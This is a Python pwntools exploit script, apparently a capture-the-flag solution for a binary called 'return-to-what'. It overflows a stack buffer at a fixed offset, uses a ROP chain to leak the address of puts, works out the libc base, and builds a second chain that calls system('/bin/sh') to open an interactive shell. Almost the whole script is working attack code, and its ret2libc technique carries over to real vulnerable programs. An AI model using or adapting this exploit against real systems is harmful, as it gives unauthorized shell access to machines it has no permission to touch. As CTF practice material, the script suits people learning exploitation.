from pwn import *

context.arch = 'amd64'

offset = 56
elf = ELF("./return-to-what")
p = elf.process()

rop = ROP(elf)
rop.call(elf.symbols["puts"], [elf.got['puts']])
rop.call(elf.symbols["vuln"])


print(p.recvuntil("\n"))
print(p.recvuntil("\n"))

payload = [
        b"A"*offset,
        rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)
puts = u64(p.recvuntil("\n").rstrip().ljust(8, b'\x00'))
log.info(f"puts found at {hex(puts)}")

# find libc using https://libc.blukat.me/
# wget "https://libc.blukat.me/d/libc6_2.27-3ubuntu1.2_amd64.so"
libc = ELF('libc6_2.27-3ubuntu1.2_amd64.so')
libc.address = puts - libc.symbols["puts"]
log.info(f"libc base address at {hex(libc.address)}")
rop = ROP(libc)
rop.call(libc.symbols["puts"], [ next(libc.search(b"main\x00")) ])
rop.call(libc.symbols["system"], [ next(libc.search(b"/bin/sh\x00")) ])
rop.call(libc.symbols["exit"])

payload = [
        b"A"*offset,
        rop.chain()
]
payload = b"".join(payload)


with open("payload", "wb") as h:
    h.write(payload)

p.sendline(payload)
p.interactive()

